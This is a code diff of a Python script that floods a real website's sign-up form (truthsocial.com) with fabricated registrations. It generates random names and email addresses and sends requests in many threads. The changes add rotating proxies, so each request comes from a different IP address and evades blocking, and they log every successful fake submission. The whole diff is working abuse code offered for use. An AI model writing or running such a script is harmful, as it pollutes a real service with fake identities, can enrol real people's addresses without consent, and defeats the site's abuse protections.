@@ -4,16 +4,26 @@ import requests
 import threading
 import random
 import time
+import logging
+
+logging.basicConfig(filename='log'+str(round(time.time())),
+                            filemode='a',
+                            format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
+                            datefmt='%H:%M:%S',
+                            level=logging.INFO)
 
 url = 'https://www.truthsocial.com/'
+
+
 
 first_names = open('names.txt','r').read().split('\n')
 last_names = [x.title() for x in open('last_names.txt','r').read().split('\n')]
 domains = ['gmail.com','yahoo.com','hotmail.com','icloud.com','aol.com',
            'comcast.net','outlook.com','sbcglobal.net','msn.com']
-
+proxylist = open('proxies.txt','r').read().split('\n')
 def do_request():
-    while True:
+    for i in range(100):
+        proxy = {'http': random.choice(proxylist)}
         first = random.choice(first_names)
         last = random.choice(last_names)
         email = first+random.choice(['-','.','_'])+last+"@"+random.choice(domains)
@@ -24,10 +34,11 @@ def do_request():
         'phone': '',
         'offers': 'on'
        }
-        response = requests.post(url,data=data).text
+        response = requests.post(url,data=data,proxies=proxy).text
         
         if "Thanks" in response:
-            print("Success with"+" "+str(first)+" "+str(last)+" "+str(email))
+            print("Success with"+" "+str(first)+" "+str(last)+" "+str(email)+" "+proxy['http'])
+            logging.info("Success with"+" "+str(first)+" "+str(last)+" "+str(email)+" "+proxy['http'])
             
 threads = []
 
